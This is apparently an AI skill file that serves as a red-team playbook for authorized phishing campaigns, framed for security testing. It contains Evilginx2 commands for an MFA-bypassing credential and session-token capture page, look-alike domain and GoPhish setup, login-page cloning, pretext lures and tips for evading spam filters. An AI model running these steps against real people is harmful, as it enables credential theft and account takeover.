---
name: phishing-and-social-engineering-campaigns
description: >
  Plan and execute authorized phishing and social engineering campaigns for red team engagements.
  Use this skill when conducting simulated social engineering attacks including email phishing,
  spear phishing, vishing, pretexting, and credential harvesting. Covers GoPhish setup, pretext
  development, payload delivery, and measuring human vulnerability. Requires explicit written
  authorization before any testing.
domain: cybersecurity
subdomain: red-teaming
category: Initial Access
difficulty: intermediate
estimated_time: "4-8 hours"
mitre_attack:
  tactics: [TA0001, TA0043]
  techniques: [T1566.001, T1566.002, T1598]
platforms: [linux, windows, macos]
tags: [phishing, social-engineering, spear-phishing, credential-harvesting, gophish, red-team, initial-access, vishing]
tools: [gophish, evilginx2, modlishka, set-toolkit, king-phisher]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Phishing & Social Engineering Campaigns

## When to Use
- During authorized red team engagements to test human security awareness
- When simulating APT initial access vectors for organizations
- When assessing email security controls (SPF, DKIM, DMARC, email gateways)
- When measuring organization's phishing susceptibility baseline
- When testing security awareness training effectiveness

**⚠️ CRITICAL**: NEVER execute social engineering attacks without explicit written authorization (Rules of Engagement). All attacks must be scoped, time-bound, and approved by organizational leadership.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: OSINT & Target Profiling

```bash
# Gather intelligence on target organization
# LinkedIn enumeration
# - Employee names, roles, email format
# - Recent hires (more susceptible)
# - Organizational structure

# Email format discovery
# Test common patterns: first.last@, f.last@, first_last@
# Use hunter.io, phonebook.cz, or email-format.com

# Company intelligence
# - Recent news/events (pretexting material)
# - Technologies used (craft tech-specific pretexts)
# - Partner organizations (third-party pretexts)
# - Office locations (physical social engineering)

# Email validation
# Verify emails exist without sending
# Tools: verify-email, emailhippo, hunter.io verify
```

### Phase 2: Infrastructure Setup

```bash
# GoPhish setup
docker pull gophish/gophish
docker run -d --name gophish -p 3333:3333 -p 8080:8080 gophish/gophish

# Access admin panel: https://localhost:3333
# Default creds: admin / <check docker logs>

# Domain setup for phishing
# 1. Register a look-alike domain (typosquatting)
#    target.com → target-security.com, targetsupport.com
# 2. Configure DNS records:
#    - A record → phishing server IP
#    - MX record → phishing server
#    - SPF record: v=spf1 ip4:YOUR_IP ~all
#    - DKIM: Generate and add DKIM record
#    - DMARC: v=DMARC1; p=none;
# 3. SSL certificate (Let's Encrypt)
sudo certbot certonly --standalone -d phish-domain.com

# Email sending setup
# Option 1: SMTP server (postfix)
# Option 2: Third-party email service
# Option 3: Office 365 compromised account (for bypass testing)
```

### Phase 3: Pretext Development

```
# Effective pretext categories:

# 1. Urgency-based
- "Your account will be locked in 24 hours"
- "Suspicious login detected — verify now"
- "Payment failed — update your billing"

# 2. Authority-based  
- "IT Department: Mandatory security update"
- "CEO/CFO: Urgent wire transfer needed"
- "HR: Annual benefits enrollment deadline"

# 3. Curiosity-based
- "Your shared document is ready for review"
- "Q4 salary adjustment notification"
- "You received a new voicemail"

# 4. Fear-based
- "Your account has been compromised"
- "Legal notice: Action required"
- "Policy violation detected on your account"

# 5. Topical/seasonal
- "Tax season: Submit W-2/tax forms"
- "Open enrollment: Update benefits"
- "COVID/remote work policy update"

# 6. Third-party impersonation
- "Microsoft 365: Password expiry notice"
- "DocuSign: Please review and sign"
- "Zoom: Meeting recording available"
```

### Phase 4: Credential Harvesting Pages

```bash
# Evilginx2 — Advanced MitM phishing (captures 2FA)
sudo evilginx2

# Configure phishlet (e.g., Office 365)
config domain phish-domain.com
config ip YOUR_IP
phishlets hostname o365 login-phish-domain.com
phishlets enable o365

# Create lure
lures create o365
lures get-url 0
# → https://login-phish-domain.com/xyz...
# Victim completes real login, session token captured

# GoPhish credential harvesting:
# 1. Create Landing Page (clone target login page)
# 2. Import Site → enter URL of target login
# 3. Check "Capture Submitted Data" and "Capture Passwords"
# 4. Set redirect to real site after capture

# Custom cloned page
# wget -r -l 1 https://target.com/login
# Modify form action to point to GoPhish
# Add hidden tracking pixel/JavaScript
```

### Phase 5: Campaign Execution

```bash
# GoPhish campaign setup:
# 1. Sending Profile: Configure SMTP settings
# 2. Email Template: Craft the phishing email
#    - Use personalization: {{.FirstName}}, {{.Email}}
#    - Include tracking pixel: {{.TrackingURL}}
#    - Phishing link: {{.URL}}
# 3. Landing Page: Credential harvesting page
# 4. User Group: Import target email list
# 5. Campaign: Combine all elements, set launch time

# Campaign best practices:
# - Send in small batches (avoid spam filters)
# - Send during business hours (9-11 AM local time)
# - Personalize emails (spear phishing)
# - Use realistic display names
# - Match email template to pretext scenario
# - Include unsubscribe link (looks legitimate)

# Track metrics in GoPhish dashboard:
# - Emails sent
# - Emails opened (tracking pixel)
# - Links clicked
# - Credentials submitted
# - Reported to security team
```

### Phase 6: Reporting & Metrics

```
Campaign Report Template:
=========================
Campaign: [Name]
Duration: [Start Date] — [End Date]
Targets: [Number of targets]

Results:
  Emails Sent:           500
  Emails Delivered:       487 (97.4%)
  Emails Opened:         312 (64.1%)
  Links Clicked:         156 (32.0%)
  Credentials Submitted:  78 (16.0%)
  Reported to IT:          23 (4.7%)

Department Breakdown:
  HR:        45% click rate
  Finance:   38% click rate
  IT:        12% click rate
  Engineering: 15% click rate

Recommendations:
1. Mandatory security awareness training (focus on HR, Finance)
2. Implement phishing-resistant MFA (FIDO2/WebAuthn)
3. Deploy email banner for external emails
4. Improve phishing report mechanism (one-click report button)
5. Conduct quarterly phishing simulations
```

## 🔵 Blue Team Detection
- **Email security**: SPF, DKIM, DMARC enforcement (reject policy)
- **Link scanning**: Real-time URL analysis for credential harvesting pages
- **MFA**: Deploy phishing-resistant MFA (FIDO2 keys, not SMS)
- **User reporting**: Easy phishing report button in email client
- **SIEM alerts**: Detect mass credential submissions from unknown domains
- **Awareness training**: Regular phishing simulations with follow-up training

## Key Concepts
| Concept | Description |
|---------|-------------|
| Spear phishing | Targeted phishing at specific individuals using personalized pretexts |
| Credential harvesting | Cloned login pages that capture usernames and passwords |
| MitM phishing | Proxying real login to capture session tokens (bypasses 2FA) |
| Pretexting | Creating a fabricated scenario to manipulate targets |
| Vishing | Voice phishing via phone calls |
| Whaling | Targeting C-level executives |


## Output Format
```
Phishing And Social Engineering Campaigns — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- MITRE ATT&CK: [T1566 — Phishing](https://attack.mitre.org/techniques/T1566/)
- GoPhish: [Official Documentation](https://docs.getgophish.com/)
- Evilginx2: [GitHub](https://github.com/kgretzky/evilginx2)
